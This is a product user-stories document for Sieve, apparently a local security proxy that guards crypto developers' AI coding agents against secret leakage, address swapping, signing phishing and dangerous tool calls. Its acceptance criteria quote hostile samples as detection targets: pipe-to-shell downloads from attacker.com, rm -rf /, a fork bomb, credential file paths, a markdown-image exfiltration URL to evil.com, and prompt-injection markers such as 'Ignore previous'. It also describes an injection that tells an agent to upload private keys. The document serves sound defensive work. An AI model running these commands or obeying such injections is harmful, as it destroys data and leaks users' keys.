# Sieve 用户故事

> 本文件是 [PRD v1.5](../prd/sieve-prd-v1.5.md) §3（用户画像）+ §4（核心场景）+ §5（功能需求）的故事化展开。所有 user story 与 PRD 检测项 ID（`OUT-*` / `IN-CR-*` / `IN-GEN-*`）双向对齐。US-01~17 对应 v1.4，US-18~20 对应 v1.5 multi-agent 扩展。

---

## 用户角色

### P0 客群：Crypto-native AI 重度开发者（首要）

- 用 Claude Code / 自写 agent 写代码 ≥ 4 小时/天
- 工作涉及智能合约、DeFi 协议、钱包前端、交易脚本、跨链桥
- 持有 $10K+ crypto 资产，部分 $100K-$10M
- 同时使用 OpenAI / Anthropic / OpenRouter / 国内中转站
- 付费意愿：**$49/月无感**
- 地理分布：**海外为主**（欧美 / 东南亚 / 港台），中文圈 dev 但居住海外

### P1 客群：智能合约开发者 + 协议团队成员

- DeFi 协议开发者、bug bounty hunter、合约审计师
- 单笔工作潜在金额 $100K-$100M
- 用 AI 辅助写/审计 Solidity / Vyper / Move / Rust 合约
- 付费意愿：**$49/月**，公司报销

> 详见 [PRD v1.4 §3.1-3.2](../prd/sieve-prd-v1.5.md#3-用户画像)

### ❌ 不服务的客群


| 客群                      | 原因                                                                   |
| ----------------------- | -------------------------------------------------------------------- |
| 企业 CISO                 | Nightfall / Lakera 主场，与一人项目调性不符                                      |
| Crypto 散户（不写代码）         | 钱包扩展即可                                                               |
| 国内政企                    | 奇安信 / 深信服市场，合规复杂                                                     |
| 纯 web2 程序员（无 crypto 资产） | 付费意愿不足以支撑误报治理成本                                                      |
| **中国大陆境内的公开 to-C 商业化**  | 见 [PRD §11.5](../prd/sieve-prd-v1.5.md#115--中国大陆合规边界v13-新增)，营销渠道分级处理 |


> 详见 [PRD v1.4 §3.3](../prd/sieve-prd-v1.5.md#33-不服务的客群)

---

## 用户故事清单

### US-01: 出站脱敏 · .env 私钥（场景 A：自动脱敏不打断）

**作为** P0 crypto-native 开发者，**我希望** 当我把整个 `.env` 文件粘贴给 Claude Code 调试跨链转账脚本时，敏感内容被**自动擦除后请求继续发送**，工作流不被打断，**以便** 我不会因为一次手抖把私钥发给中转站，同时也不需要每次都手动确认。

**关联 PRD**：[§4.1 场景 A](../prd/sieve-prd-v1.5.md#41-场景-a出站防泄漏) / [§5.1 OUT-01~05、OUT-12](../prd/sieve-prd-v1.5.md#51-出站检测) / [§5.3 处置矩阵](../prd/sieve-prd-v1.5.md#53-处置矩阵) / [§9 第 13 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束)
**关联 SPEC/ADR**：SPEC-002 §2.2 / ADR-016
**优先级**：P0
**验收标准**：

1. OUT-01（API key）/ OUT-02（AWS key）/ OUT-03（GitHub token）/ OUT-04（JWT）/ OUT-05（SSH 私钥）/ OUT-12（数据库连接串）命中后，主代理**自动改写 body bytes**（脱敏占位符格式：`[REDACTED-<TYPE>]`），请求继续转发到上游——**不弹窗、不等用户确认**
2. 脱敏完成后菜单栏图标 5 秒高亮 + 文字气泡，展示脱敏项数量与类型（例："已脱敏 3 项：1 个 Ethereum API key、1 个 GitHub token、1 个数据库连接串"）
3. Claude Code 工作流不被打断：用户发出请求到模型收到请求，端到端延迟仅增加脱敏改写耗时（目标 P99 < 5ms 额外延迟）
4. 用户可在菜单栏审计日志查看每次脱敏事件（rule_id / 脱敏类型 / 时间戳），**审计日志不存原文**
5. OUT-01~05、OUT-12 各项 Critical FP < 0.5%（PRD §6.5 误报预算）
6. `.sieveignore` 中的白名单 fingerprint 命中时跳过脱敏，不触发气泡通知

---

### US-02: 出站防泄漏 · BIP39 助记词（差异化点）

**作为** P0 客群，**我希望** Sieve 能识别 12/15/18/21/24 词的 BIP39 助记词并通过 **SHA-256 校验位** 判定它是真实助记词而非随机词序，**以便** 我能放心使用 AI 助手讨论钱包恢复 / HD wallet 派生流程，又不会把真实助记词漏出去。

**关联 PRD**：[§5.1 OUT-09](../prd/sieve-prd-v1.5.md#51-出站检测) / [§9 第 4 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束)
**优先级**：P0
**验收标准**：

- 12/15/18/21/24 词且 SHA-256 校验通过 → Critical 拦截
- 12/15/18/21/24 词但 SHA-256 校验失败 → 不报警（避免误报正常英文文档）
- OUT-09 Critical FP < 0.05%（PRD §5.1 表格）
- 在 README 与营销文章中作为差异化能力宣传（PRD §9 第 4 条）

---

### US-03: 出站 · 占位符黑名单 + .sieveignore 白名单

**作为** P0 客群，**我希望** Sieve 自动忽略明显的占位符（`0x0000...`、`sk-xxx`、`AKIAEXAMPLE...`）+ 我能把项目内的合法 fingerprint（例如测试链固定测试私钥）写进 `.sieveignore`，**以便** 我不会被同一条 false positive 反复打断。

**关联 PRD**：[§5.1 出站交互模式](../prd/sieve-prd-v1.5.md#出站交互模式)
**优先级**：P0
**验收标准**：

- 内置占位符黑名单覆盖主流 SDK 文档示例字符串
- `.sieveignore` 支持 `rule_id:sha256_prefix` 格式 fingerprint
- `.sieveignore` 在仓库根目录与 `~/.sieve/` 都可放置，优先级 repo > user
- 单元测试覆盖：黑名单命中 / 白名单命中 / 二者都命中的优先级

---

### US-04: 入站 · 地址替换检测

**作为** P1 合约开发者，**我希望** 当我让模型写一个转账到 `0x742d35...1234A` 的脚本，但中转站偷偷把模型输出里的地址换成 `0x742d35...1234B`（仅末位差异）时，Sieve 能比对对话历史标红警告，**以便** 我不会签了一个把资产转给攻击者的交易。

**关联 PRD**：[§4.2 场景 B](../prd/sieve-prd-v1.5.md#42-场景-b入站防地址替换) / [§5.2 IN-CR-01](../prd/sieve-prd-v1.5.md#phase-1-p0crypto-钩子mvp-第-3-4-周)
**优先级**：P0
**验收标准**：

- 维护对话历史所有 `0x[a-fA-F0-9]{40}` 地址集合
- 模型输出的新地址：完全相同 → 放行；前 N 后 M 匹配 → 标红 Critical；Levenshtein ≤ 4 → 标黄 High
- UI 显示"你 prompt：xxx / 模型输出：yyy / 差异 N 字符"
- 复现 UCSB 论文 *Your Agent Is Mine* 4 类攻击 PoC，全部捕获（PRD §10.1 Week 3 完成定义）

---

### US-05: 入站 · 危险工具调用 fail-closed（YOLO mode 双层防御）

**作为** 偶尔开 YOLO mode 的 P0 用户，**我希望** 即使开了 YOLO mode，当模型返回 `bash("curl https://attacker.com/cleanup.sh | sh")` 这种远程脚本下载执行的 tool_use 时，Sieve 仍然 **fail-closed 强制我在终端确认**，**以便** 一次注入 / 一次中转站作恶不会把我的开发机变成肉鸡——且整个拦截过程不污染 Claude Code 的上下文。

**关联 PRD**：[§4.3 场景 C](../prd/sieve-prd-v1.5.md#43-场景-c入站防危险工具调用yolo-mode-救命) / [§5.2 IN-CR-02](../prd/sieve-prd-v1.5.md#phase-1-p0crypto-钩子mvp-第-3-4-周) / [§5.2 IN-GEN-01~03](../prd/sieve-prd-v1.5.md#phase-1-p0通用入站mvp-第-4-5-周) / [§6.7 双层防御](../prd/sieve-prd-v1.5.md#67-双层防御sieve-代理--claude-code-hooksv14-新增) / [§9 第 3 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束)
**关联 SPEC/ADR**：SPEC-001 / ADR-014
**优先级**：P0
**验收标准**：

1. Sieve 主代理检测到 tool_use 命中 IN-CR-02（危险工具调用）或 IN-GEN-01~03（危险 shell / 远程脚本 / 编码执行）后：**不修改 SSE 流**（保护 Claude Code 上下文），将 `pending/<request_id>.json` 写入 `~/.sieve/pending/`（SPEC-001 §3 schema）
2. Claude Code 准备执行 tool 前触发 `sieve-hook check`（PreToolUse hook）；sieve-hook 启动时延 < 50ms（实测目标 4-5ms）
3. sieve-hook 在 Claude Code 终端输出：rule_id + one_line_summary + 完整命令参数摘要（≤ 200 字符）+ 倒计时（30 秒，`default_on_timeout: deny`）+ `Allow this tool call? [y/N]:`
4. 用户输入 `y` → sieve-hook exit 0 → Claude Code 执行；输入 `N` / 直接回车 / 超时 → exit 1 → Claude Code **不执行**
5. 同一请求多条规则命中时，sieve-hook 合并为一次提示（"检测到 2 个问题：..."），不重复弹
6. **YOLO mode 不可关闭此机制**：`config.toml` 中试图对任意 IN-CR-02/IN-GEN-01~03 写 `disabled = true` 时，启动失败 + 明确错误信息（PRD §9 第 3 条 + ADR-014）
7. 以下模式全部命中：`curl .. | sh`、`wget .. | bash`、`bash <(curl ..)`、`eval(base64.b64decode(..))`、`rm -rf /`、fork bomb `:(){ :|:& };:`、`> /dev/sda`

---

### US-06: 入站 · 签名工具 fail-closed

**作为** P1 合约开发者，**我希望** 任何 `eth_sendTransaction` / `signTransaction` / `signMessage` / `signTypedData` 调用都被 Sieve 强制弹窗，**且 YOLO mode 不可关闭**，弹窗显示完整 typed data + 解析 `verifyingContract`（自动识别 Pink Drainer 数字化绕过等已知模式），**以便** 我不会因为模型/中转站构造的 EIP-712 钓鱼签名而授权 drainer。

**关联 PRD**：[§4.4 场景 D](../prd/sieve-prd-v1.5.md#44-场景-d入站防签名钓鱼) / [§5.2 IN-CR-05](../prd/sieve-prd-v1.5.md#phase-1-p0crypto-钩子mvp-第-3-4-周) / [§9 第 3 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束)
**优先级**：P0
**验收标准**：

- 上述 4 个签名相关 RPC 方法 100% 触发 Critical 拦截
- 弹窗解析 `verifyingContract` 数字 → 0x 地址 → 已知协议白名单匹配状态
- 数字化 verifyingContract 触发"已知 drainer 模式：数字化绕过"提示
- **YOLO mode 不可关闭**（PRD §9 第 3 条），配置文件试图关闭时启动失败

---

### US-07: 入站 · 敏感路径访问 + 持久化机制

**作为** P0 客群，**我希望** 当模型返回的 tool_use 试图读 `~/.ssh/id_rsa` / `~/.aws/credentials` / `/etc/shadow` / `*.keystore` / `~/.config/solana/`，或写 `crontab` / `launchd` / `systemd` / `.bashrc` / `.zshrc` 时，Sieve 区分严重度处置——读敏感路径 = **High 警告**（合法用例存在，需用户判断），写持久化机制 = **Critical 拦截**（埋后门级别），**以便** 即使我让模型"清理一下机器"也不会被偷走凭证或埋后门。

**关联 PRD**：[§5.2 IN-CR-03 / IN-CR-04](../prd/sieve-prd-v1.5.md#phase-1-p0crypto-钩子mvp-第-3-4-周)
**优先级**：P0
**验收标准**：

- IN-CR-03 路径黑名单覆盖 SSH / AWS / GCP / Solana / Ethereum keystore + GPG / netrc / macOS Keychain / dotenv（10 条子规则，allowlist 防 FP）
- IN-CR-04 持久化机制覆盖 cron / launchd / systemd / shell rc 文件
- 读 vs 写区分：读敏感路径 = High，写持久化机制 = Critical
- 二者命中时 Critical/High FP 分别 < 0.5% / < 3%（PRD §6.5）

**实施状态**：
- IN-CR-03（read = High warn）：Week 4 完成（10 条规则上线）；5s 倒计时弹窗 UI 留 Week 5
- IN-CR-04（write = Critical block + fail-closed）：Week 4 完成（9 条规则上线 + 全部进
  `FAIL_CLOSED_RULES`，YOLO mode 不可关）；192/192 测试通过

---

### US-08: 入站 · Markdown 图片 exfil + Prompt injection 反向

**作为** P0 客群，**我希望** 模型返回的 markdown 中如果含 `![](http://evil.com/?leak=私钥)` 这种通过图片 URL 偷数据的模式 + 任何 `<|im_start|>` / `[INST]` / `### System:` / `Ignore previous` 反向 prompt injection 都被 Sieve 标红，**以便** 我不会因为渲染 markdown 时浏览器/IDE 自动 fetch 图片而泄漏数据。

**关联 PRD**：[§5.2 IN-GEN-04 / IN-GEN-05](../prd/sieve-prd-v1.5.md#phase-1-p0通用入站mvp-第-4-5-周)
**优先级**：P0
**验收标准**：

- IN-GEN-04：markdown 图片 URL 域名不在白名单 + 含可疑 query string → High 警告
- IN-GEN-05：上述四种 prompt injection 标记字符串 → High 警告
- 二者均为 High，IN-GEN-* High FP < 10%（PRD §6.5）
- 用户可通过 `.sieveignore` 加白名单域名

---

### US-09: 处置 UI 一致性 · 二维矩阵两条 UX 哲学

**作为** P0 crypto 开发者，**我希望** Sieve 对出站和入站使用不同的 UX 哲学——出站脱敏类不打断我工作，入站危险操作前永远问我——**以便** 我不被高频脱敏类弹窗骚扰，但对签名 / 危险 bash 等不可逆动作始终有强制摩擦。

**关联 PRD**：[§5.3 处置矩阵](../prd/sieve-prd-v1.5.md#53-处置矩阵) / [§5.4 HIPS 弹窗架构](../prd/sieve-prd-v1.5.md#54-hips-弹窗架构--超时策略v14-新增) / [§9 第 8 条、第 13 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束)
**关联 SPEC/ADR**：SPEC-002 / ADR-016 / ADR-014
**优先级**：P0
**验收标准**：

1. **出站默认信任用户、帮他擦屁股**：OUT-01~05 / OUT-12 自动脱敏 + 状态栏 5 秒气泡，**不弹窗不等用户确认**；OUT-06 / OUT-08 弹窗 15 秒（超时默认脱敏发送）；OUT-07 / OUT-09 / OUT-10 弹窗 60 秒（超时默认完全拦截）
2. **入站默认怀疑上游、要用户授权**：所有 IN-CR-* 和 IN-GEN-01~04 默认 fail-closed（超时拒绝），分两类：
   - Hook 类（IN-CR-02 / IN-CR-03 / IN-CR-04 / IN-GEN-01~03）：sieve-hook 在 Claude Code 终端弹 `y/N`
   - GUI 类（IN-CR-01 / IN-CR-05 / IN-GEN-04）：Native GUI App 弹独立窗口
3. 危险等级越高给的时间越长（IN-CR-05 签名 = 120 秒、IN-CR-04 持久化 = 60 秒、其余 Hook 类 = 30 秒、OUT-06 = 15 秒）
4. 倒计时三段视觉：前 50% 温和 / 后 30% 数字变红 / 最后 20% 数字闪烁 + 进度条变红（SPEC-002 §4）
5. 同一请求多 issue 合并到一个弹窗——**不允许同一请求弹两个以上窗口**（SPEC-002 §7）
6. Critical 不可永久白名单：即使 preset=Custom，也不允许对 IN-CR-01 / IN-CR-05 写 "Allow + Remember"（加载阶段 `critical_lock` 强制校验）
7. 配置文件试图关闭任意 Critical 检测项 → 启动失败 + 明确错误信息
8. 降级模式（试用期结束未付费）下 Critical 保留弹窗，仅由"执行拦截"降为"只读警告"——参见 US-12

---

### US-10: 规则更新 · Ed25519 签名 + 离线可用

**作为** P0 客群（含部分时间断网工作的开发者），**我希望** Sieve 的规则库每周通过签名文件下载、用 Ed25519 签名验证、客户端只下载不上传，**且静态资源更新可关闭、完全离线可用**，**以便** 我在 air-gapped 环境也能用，且不会被一次规则下发投毒。

**关联 PRD**：[§8.3 规则更新](../prd/sieve-prd-v1.5.md#83-规则更新) / [§9 第 6 条 + 第 2 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束)
**优先级**：P0
**验收标准**：

- 规则更新前必须 Ed25519 签名验证通过，否则拒绝加载并保留旧规则
- 配置项 `rules.update.enabled = false` 关闭后完全离线可用，不影响 Critical 拦截
- 客户端**绝不**上传 prompt / 样本 / 命中信息（PRD §11.2）
- 透明日志：每次规则更新发布 changelog + 哈希到 GitHub Releases

---

### US-11: 自证清白 · 用户能用 cosign 验证二进制

**作为** P1 审计研究员，**我希望** Sieve 每个 release 都有 sigstore 签名 + reproducible build 凭证 + pinned dependencies 锁文件，且我能用 `cosign verify` 在本地独立验证下载的二进制确实来自公开声明的构建流程，**以便** Sieve 自己不会成为下一个 LiteLLM 供应链事件。

**关联 PRD**：[§1.2 第 4 句](../prd/sieve-prd-v1.5.md#12-四句话核心叙事v13-加第-4-句) / [§9 第 6 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束) / [§10.1 Week 1](../prd/sieve-prd-v1.5.md#week-1基础设施--anthropic-协议) / [§11.3](../prd/sieve-prd-v1.5.md#113-开源策略)
**优先级**：P0（**Week 1 必须跑通**，§10.1）
**验收标准**：

- GitHub Actions reproducible build pipeline Week 1 跑通
- 每个 release 附 sigstore 签名 + SLSA provenance
- README 提供 `cosign verify-blob` 一行命令示例
- 核心引擎 Week 12 GA 后开源（MIT），用户可独立从源码复现二进制
- 营销文章"自证清白：Sieve 怎么证明自己不是新的 LiteLLM"（PRD §10.2 Week 10 文章 2）

---

### US-12: 降级模式 · 试用结束变只读警告

**作为** 14 天试用结束未付费的潜在用户，**我希望** Sieve 不会突然完全失效让我裸奔，而是 **降级为只读警告模式**——继续显示告警但不再 Critical 拦截，**以便** 我有充足时间评估是否付费 $49/月，同时不会立即陷入"无 Sieve 也无防护"的 worst case。

**关联 PRD**：[§7.1 单一定价](../prd/sieve-prd-v1.5.md#71-单一定价) / [§14 Open Question 6](../prd/sieve-prd-v1.5.md#14-open-questions还需要-doskey-决策)
**优先级**：P0
**验收标准**：

- 14 天试用 license 到期后自动切到 "Read-only Warn" 模式
- 降级模式下：所有检测照常运行，但 Critical 不阻断、High 倒计时去掉、用户行为照常
- 状态栏 / CLI banner 持续显示"已降级 - 升级 $49/月恢复全功能"
- 升级流程：付款后 license key 重新激活即可恢复，无需重启进程
- **不让用户感觉被坑**（PRD §14 Open Question 6 决策落地）：试用结束前 3 天提示，不偷换语义

---

### US-13: Phase 1 Week 5 里程碑 · Native GUI App + sieve setup + IPC 协议落地

**作为** 刚下载 Sieve 的新用户，**我希望** Week 5 交付的三件套（macOS Native GUI App + `sieve setup` 工具 + IPC 协议）能让我在 30 分钟内完成安装并看到第一次拦截，**以便** Sieve 对非工程背景的 crypto 开发者也能顺利上手。

**关联 PRD**：[§10.1 Week 5（v1.4 关键里程碑）](../prd/sieve-prd-v1.5.md#week-5-native-gui-app--sieve-setup-工具) / [§6.4 GUI App 职责](../prd/sieve-prd-v1.5.md#64-native-gui-app-职责v14-提到-phase-1-必做) / [§6.6 部署形态](../prd/sieve-prd-v1.5.md#66-部署形态phase-1) / [§6.7 双层防御](../prd/sieve-prd-v1.5.md#67-双层防御sieve-代理--claude-code-hooksv14-新增)
**关联 SPEC/ADR**：SPEC-001 / SPEC-002 / SPEC-003 / ADR-012 / ADR-013 / ADR-014 / ADR-015
**优先级**：P0（**Week 5 完成定义**）
**验收标准**：

1. **macOS Native GUI App（SwiftUI）交付**：菜单栏常驻、HIPS 弹窗渲染支持 §5.4 所有处置类型（GUI 弹窗 + 倒计时三段视觉）、设置面板（preset 切换）、审计日志查看器、License 管理（ADR-012）
2. **IPC 协议全链路通：主代理 ↔ GUI App**（Unix socket JSON-RPC）+ **主代理 ↔ sieve-hook**（文件 IPC）均按 SPEC-001 / ADR-013 落地；GUI 崩溃不影响主代理（进程独立）
3. **`sieve setup` 完成自动配置**：检测到 Claude Code → dry-run 打印将改的 `settings.json` 字段 → 用户确认 → 备份原文件 → 改写（写入 `ANTHROPIC_BASE_URL` + PreToolUse hook）→ 注册 launchd → 写 `~/.sieve/setup.log`（SPEC-003 §3）
4. **`sieve doctor` 全绿**：环境变量已生效 / hook 已注册 / daemon 在跑 / canary secret 触发拦截（SPEC-003 §4）
5. **Week 5 完成定义**（PRD §10.1）：doskey 的朋友（非工程背景 crypto dev）能在 30 分钟内 `.dmg` 安装 + 跑 `sieve setup` + 在 Claude Code 里触发并看到 Sieve 拦截

---

### US-14: sieve setup 一键安装

**作为** 刚接触 Sieve 的新用户，**我希望** 30 分钟内能装上 Sieve 并开始拦截，不需要手动改配置文件，**以便** 降低上手门槛，第一次拦截体验印象深刻。

**关联 PRD**：[§10.1 Week 5](../prd/sieve-prd-v1.5.md#week-5-native-gui-app--sieve-setup-工具) / [§6.6 部署形态](../prd/sieve-prd-v1.5.md#66-部署形态phase-1)
**关联 SPEC/ADR**：SPEC-003 / ADR-015
**优先级**：P0（Week 5）
**验收标准**：

1. macOS 双击 `.dmg`，拖入 Applications，启动后菜单栏常驻图标出现
2. GUI App 引导用户打开终端运行 `sieve setup`
3. `sieve setup` 探测到 Claude Code（`~/.claude/settings.json` 存在）→ dry-run 打印将改的字段（diff 格式）→ 用户输入 `y` 确认 → 备份原文件到 `~/.sieve/backups/<timestamp>/` → 改写 settings.json（写 `ANTHROPIC_BASE_URL` + `hooks.PreToolUse`）→ 注册 launchd → 写 `~/.sieve/setup.log`
4. setup 完成后自动运行 `sieve doctor`，输出 4 项全绿：环境变量已生效 / hook 已注册 / daemon 在跑 / canary secret 触发拦截
5. 任何步骤失败 → 自动调用 `rollback_changes()` 恢复备份，并输出"已回滚，请重试或提 issue"
6. 整个流程（`.dmg` 安装 + `sieve setup` + `sieve doctor`）在干净 macOS 环境下 < 5 分钟

---

### US-15: sieve uninstall 干净回滚

**作为** 试用结束想卸载 Sieve 的用户，**我希望** 一条命令彻底还原系统到安装前状态，不留垃圾文件，**以便** 对 Sieve 没有后顾之忧的信任。

**关联 PRD**：[§10.1 Week 5](../prd/sieve-prd-v1.5.md#week-5-native-gui-app--sieve-setup-工具)
**关联 SPEC/ADR**：SPEC-003 §5 / ADR-015
**优先级**：P0（Week 5）
**验收标准**：

1. `sieve uninstall`（无 flag）默认 dry-run：打印将恢复的内容清单（settings.json 恢复字段 / launchd plist 路径 / 备份位置）+ 提示"输入 `y` 确认，回车取消"
2. 用户输入 `y` → 按 `~/.sieve/setup.log` 逐步反向回滚 → `launchctl unload <plist>` → 删除 `~/.sieve/` 下 Sieve 生成的文件（**但 `~/.sieve/audit.db` 审计日志默认保留**，需单独 `--purge-logs` 强制删除）
3. uninstall 完成后 `claude --version` 正常运行、Claude Code 工作流完全恢复安装前状态（可用 `sieve doctor` 验证 hook 不再注册）
4. 若 `setup.log` 缺失（用户手动删除），输出明确提示"找不到 setup.log，请手动检查 ~/.claude/settings.json"，不静默失败

---

### US-16: HIPS 弹窗 preset 切换

**作为** 高敏感度用户，**我希望** 切到 Strict preset 把所有出站脱敏类改成弹窗确认，**以便** 对私钥类脱敏有完全的主动意识，哪怕每次都要点一下。

**关联 PRD**：[§5.4.4 Settings preset](../prd/sieve-prd-v1.5.md#544-settings-preset)
**关联 SPEC/ADR**：SPEC-002 §6 / ADR-016 / ADR-014
**优先级**：P1（Week 7-8 GUI 打磨期）
**验收标准**：

1. GUI 设置面板提供 4 个 preset 按钮：Strict / Default / Relaxed / Custom，切换后实时生效（不需要重启代理）
2. **Strict**：所有倒计时砍半，OUT-01~05 改为 GUI 弹窗确认（不再自动脱敏）
3. **Relaxed**：所有倒计时翻倍，IN-GEN-01~03 改为 fail-open（超时默认放行而非拒绝）
4. **Custom**：每条规则可单独配 timeout、default_on_timeout、disposition
5. **入站签名 / 不可逆动作类（IN-CR-01 / IN-CR-05）在所有 preset 下永远不允许配置永久白名单**——加载阶段 `critical_lock` 强制校验，Custom preset 也不例外；违规配置 → 启动失败
6. preset 配置写入 `~/.sieve/config.toml`，重启后保持

---

### US-17: sieve-hook 终端弹窗体验

**作为** 日常使用 Claude Code 的 P0 用户，**我希望** Hook 类拦截发生时直接在我工作的终端里处理，不需要切窗口，**以便** 决策摩擦最小化，安全感知不打断编码心流。

**关联 PRD**：[§4.3 场景 C](../prd/sieve-prd-v1.5.md#43-场景-c入站防危险工具调用yolo-mode-救命) / [§6.7 双层防御](../prd/sieve-prd-v1.5.md#67-双层防御sieve-代理--claude-code-hooksv14-新增)
**关联 SPEC/ADR**：SPEC-001 / ADR-014
**优先级**：P0（Week 4）
**验收标准**：

1. 主代理检测到 Hook 类规则命中后写 `~/.sieve/pending/<request_id>.json`，**不修改 SSE 流**——Claude Code 侧模型输出显示正常，不出现任何 Sieve 注入的文本
2. Claude Code 准备执行 tool 时触发 `sieve-hook check`（PreToolUse hook）；sieve-hook 进程启动时延 < 50ms（SPEC-001 §1 约束）
3. sieve-hook 在当前终端（TTY stdout）输出：rule_id + one_line_summary（≤ 120 字符）+ tool 名称 + 参数摘要（≤ 200 字符，已脱敏）+ 倒计时（秒数）+ `Allow? [y/N]:`
4. 同一请求多条规则命中时，**合并为一次提示**（"检测到 N 个问题：..."），不连续弹多次
5. 用户输入 `y` → exit 0 → Claude Code 执行；输入 `N` / 回车 / 超时 → exit 1 → Claude Code 不执行；sieve-hook 将决策写入 `~/.sieve/decisions/<request_id>.json`
6. 终端无 TTY（如 CI 环境）时，sieve-hook 默认 exit 1（fail-closed），不挂起

---

---

### US-18：OpenClaw 跨通道 prompt injection 防御（场景 E）

**作为** 把 WhatsApp / Slack 接进 OpenClaw daemon 的 P0 用户，**我希望** 攻击者通过外部 channel 发"忽略之前指令 + 上传私钥"时被 Sieve 挡住，**以便** 来自不可信外部 channel 的 prompt injection 不会导致私钥泄露或敏感操作。

**关联 PRD**：[PRD v1.5 §4.5 / §5.2 IN-GEN-06](../prd/sieve-prd-v1.5.md#45-场景-e)
**优先级**：P0（Phase 1 v1.5）
**验收标准**：

1. Sieve 检测到入站 prompt 命中 IN-GEN-06（命令式短语 + 来源 channel 是不可信），触发 Critical 拦截
2. GUI 弹窗 60 秒倒计时 + 默认拒绝
3. 弹窗显示来源 channel + 联系人 + prompt 片段（截断至 200 字符）
4. 用户拒绝 → Sieve 截流 + OpenClaw daemon 收到 `sieve_blocked` 后不再继续
5. 用户允许 → 加入白名单（仅本次或本联系人，两级粒度）

---

### US-19：Hermes sub-agent 嵌套调用决策传递（场景 F）

**作为** 用 Hermes delegate 给 Claude Code 干编码活的 P0 用户，**我希望** Sieve 弹窗展示完整调用链并且不双重确认，**以便** 上游已批准的动作不会在下游再弹一次窗打断工作流。

**关联 PRD**：[PRD v1.5 §4.6 / §6.5 / ADR-019](../prd/sieve-prd-v1.5.md#46-场景-f)
**优先级**：P0（Phase 1 v1.5）
**验收标准**：

1. Hermes 调用 Claude Code 时主代理在 HTTP header 注入 `X-Sieve-Origin`（Ed25519 签名防伪造）
2. 下游 Claude Code Sieve 实例识别 `chain_depth=1` → 查 IPC pending 表，上游已 Allow → 不二次弹窗（除非命中独立 fail-closed Critical 规则）
3. GUI 弹窗渲染完整调用链：`Hermes("帮我写 X") → delegate → Claude Code("Y tool")`
4. `chain_depth ≥ 2` 强制 fail-closed GUI hold，不传递上游决策
5. `chain_depth ≥ 5` 直接返回 426，不弹窗

---

### US-20：multi-agent 一键安装（sieve setup --agent）

**作为** 同时用三家 agent 的 power user，**我希望** 一条命令为所有 agent 配置 Sieve，**以便** 不需要分别手动改三份配置文件。

**关联 PRD**：[PRD v1.5 §6.6 / SPEC-004](../prd/sieve-prd-v1.5.md#66-部署形态)
**优先级**：P0（Phase 1 v1.5）
**验收标准**：

1. `sieve setup --all-detected` 自动扫描系统已安装的 agent（Claude Code / OpenClaw / Hermes）
2. 逐个 dry-run 显示每家的改动 diff + 用户确认后执行
3. 任一 agent 配置失败 → 自动回滚所有已做改动，输出回滚清单
4. 完成后运行 `sieve doctor --all`，三家全绿才算通过
5. `sieve uninstall --all` 一键清理所有 agent 适配（按 `setup.log` 逆序回滚）

---

### US-21：用户最怕的五件事 baseline 验收（v1.5.1 新增）

**作为** P0 crypto-native 开发者，**我希望** Sieve 能拦住我作为 crypto 开发者最怕的五类攻击 —— **签名诱导 / 转账伪造 / .env 外泄 / 私钥外泄 / shell RCE** —— 同时不会在我做这五类的合法日常工作（写转账逻辑、读 dotenv 文档、用 systemctl 配服务、教徒弟 ssh-keygen）时弹窗骚扰，**以便** 我可以信任 Sieve 一直挂着用一周不需要二次确认。

**关联 PRD**：[PRD v1.5 §5.2 IN-CR-* + §9 #7](../prd/sieve-prd-v1.5.md)
**关联文档**：[CHANGELOG v1.5.1](../changelog/CHANGELOG.md#v151-rule-expansion---2026-05-01) / [tasks/2026-05-01-test-data-expansion-report.md](../../tasks/2026-05-01-test-data-expansion-report.md)
**优先级**：P0（Phase 1 v1.5.1，付费门槛级）
**验收标准**（基于 1896 样本数据集，见 `crates/sieve-rules/bench-data/`）：

1. **拦截率**：attacks-by-fear/{signing,transfer,env-leak,private-key,shell-rce}/ 五桶整体 recall > 95%（当前 97.13%）
   - signing 100% / shell-rce 97.5% / env-leak 97.5% / private-key 88.33%（剩 BIP39 second-pass 待 Sprint）
2. **零误伤**：benign-near/ 10 桶（含 near-IN-CR-02-rce 100 条 systemctl/eval/dd 教学样本、near-IN-CR-04-persistence 100 条 cron/launchd 文档样本等）整体 Critical FP rate < 0.5%（当前 0.00%）
3. **回归门禁**：任何新规则 / allowlist 调整 PR 必须跑 `cargo test -p sieve-rules --release --test dataset_fp_rate -- --ignored` 且 per-bucket 报告贴 PR description
4. **数据集长期持有**：bench-data 不可删除，`benign-near/`、`attacks-by-fear/` 命名 + 桶结构作为长期 baseline，新增样本只增不删
5. **盲区透明**：当前已知盲区记录在 [tasks/2026-05-01-rule-gaps.md](../../tasks/2026-05-01-rule-gaps.md)，营销文案不夸大覆盖率

---

## 未覆盖的 Phase 2 故事

以下故事属于 [PRD §5.1 / §5.2 Phase 2](../prd/sieve-prd-v1.5.md#5-功能需求) 范围，**Phase 1 不实现**，待真有用户需求 + 第二个商业化客户主动要时启动：


| 编号草稿     | 故事概要                                                                               | 关联 PRD                             |
| -------- | ---------------------------------------------------------------------------------- | ---------------------------------- |
| US-P2-01 | MCP server 调用拦截 + scope-aware policy（不在 allowlist 强制确认 / 参数敏感关键字拦截 / MCP 输出反向利用检测） | §5.2 Phase 2 IN-MCP-01~03（v1.3 新增） |
| US-P2-02 | Solidity 后门检测（Slither 集成）                                                          | §5.2 Phase 2                       |
| US-P2-03 | Drainer 黑名单（Chainabuse + ScamSniffer 集成）                                           | §5.2 Phase 2 + §13.2 数据合作          |
| US-P2-04 | npm / pip typosquat 检测                                                             | §5.2 Phase 2                       |
| US-P2-05 | Calldata 静态解码（4byte 离线 SQLite）                                                     | §5.2 Phase 2                       |
| US-P2-06 | ERC20 危险 approve（approve(MAX) / setApprovalForAll）                                 | §5.2 Phase 2                       |
| US-P2-07 | EIP-2612 / EIP-7702 滥用检测                                                           | §5.2 Phase 2                       |
| US-P2-08 | Unicode 攻击防御（NFC + 控制字符黑名单）                                                        | §5.2 Phase 2                       |
| US-P2-09 | 中文 PII（身份证 / 银行卡 / 统一信用代码）                                                         | §5.1 Phase 2                       |
| US-P2-10 | 自定义规则 DSL                                                                          | §5.1 Phase 2                       |
